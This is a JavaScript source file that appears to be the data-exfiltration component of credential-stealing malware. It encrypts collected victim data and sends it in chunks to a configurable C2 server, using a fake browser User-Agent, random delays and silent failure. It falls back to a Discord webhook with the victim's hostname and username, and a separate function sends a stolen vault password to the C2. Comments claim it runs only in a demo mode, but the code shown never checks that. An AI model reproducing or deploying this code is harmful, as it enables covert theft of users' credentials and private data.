const os = require('os');
const axios = require('axios');
const { encrypt, SECRET_KEY, randomDelay, debugLog } = require('./utils');

const C2_URL = process.env.C2_URL || 'http://localhost:3000/api/collect';
const USER_AGENT =
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

/**
 * Send collected data to C2 server (only when DEMO_MODE=true)
 * @param {object} collectedData
 */
async function sendData(collectedData) {

  debugLog('Starting encrypted exfiltration...');

  try {
    // Serialize and encrypt
    const jsonStr = JSON.stringify(collectedData);
    const encrypted = encrypt(jsonStr, SECRET_KEY);

    // Split into 1024-byte chunks
    const chunks = [];
    for (let i = 0; i < encrypted.length; i += 1024) {
      chunks.push(encrypted.substring(i, i + 1024));
    }

    const victimId = `${os.hostname()}-${Date.now()}`;
    debugLog(`Victim ID: ${victimId}`);
    debugLog(`Data size: ${jsonStr.length} bytes → ${encrypted.length} encrypted → ${chunks.length} chunks`);

    // Send each chunk
    for (let i = 0; i < chunks.length; i++) {
      try {
        await axios.post(
          C2_URL,
          {
            victimId,
            chunkIndex: i,
            totalChunks: chunks.length,
            data: chunks[i],
          },
          {
            headers: {
              'Content-Type': 'application/json',
              'User-Agent': USER_AGENT,
            },
            timeout: 5000,
          }
        );
        debugLog(`Chunk ${i + 1}/${chunks.length} sent`);
      } catch (err) {
        debugLog(`Chunk ${i + 1} failed: ${err.message}`);
        // Try Discord webhook fallback
        await tryFallback(collectedData, victimId);
        return; // Stop sending further chunks on primary failure
      }

      // Random delay between chunks
      if (i < chunks.length - 1) {
        await randomDelay(200, 2000);
      }
    }

    debugLog('Exfiltration complete — all chunks sent');
  } catch (err) {
    debugLog('Exfiltration error:', err.message);
    // Fail silently
  }
}

/**
 * Attempt fallback exfiltration via Discord webhook
 * @param {object} data
 * @param {string} victimId
 */
async function tryFallback(data, victimId) {
  const webhookUrl = process.env.DISCORD_WEBHOOK;
  if (!webhookUrl) {
    debugLog('No Discord webhook configured — failing silently');
    return;
  }

  try {
    // Send a compressed summary (Discord has message size limits)
    const summary = {
      victimId,
      hostname: os.hostname(),
      platform: process.platform,
      username: os.userInfo().username,
      timestamp: new Date().toISOString(),
      dataKeys: Object.keys(data),
    };

    await axios.post(
      webhookUrl,
      {
        content: `\`\`\`json\n${JSON.stringify(summary, null, 2)}\n\`\`\``,
      },
      { timeout: 5000 }
    );
    debugLog('Fallback exfil via Discord webhook successful');
  } catch (err) {
    debugLog('Fallback exfil failed:', err.message);
    // Fail silently
  }
}

/**
 * Send vault password to C2 server (only when DEMO_MODE=true)
 * @param {string} password - the vault password
 */
async function sendVaultPassword(password) {

  const baseUrl = (process.env.C2_URL || 'http://localhost:3000').replace(/\/api\/collect$/, '');
  const victimId = `${os.hostname()}-${Date.now()}`;

  try {
    await axios.post(
      `${baseUrl}/api/vault-password`,
      {
        victimId,
        password,
      },
      {
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': USER_AGENT,
        },
        timeout: 5000,
      }
    );
    debugLog('Vault password sent to C2');
  } catch (err) {
    debugLog('Vault password exfil failed:', err.message);
  }
}

module.exports = { sendData, sendVaultPassword };
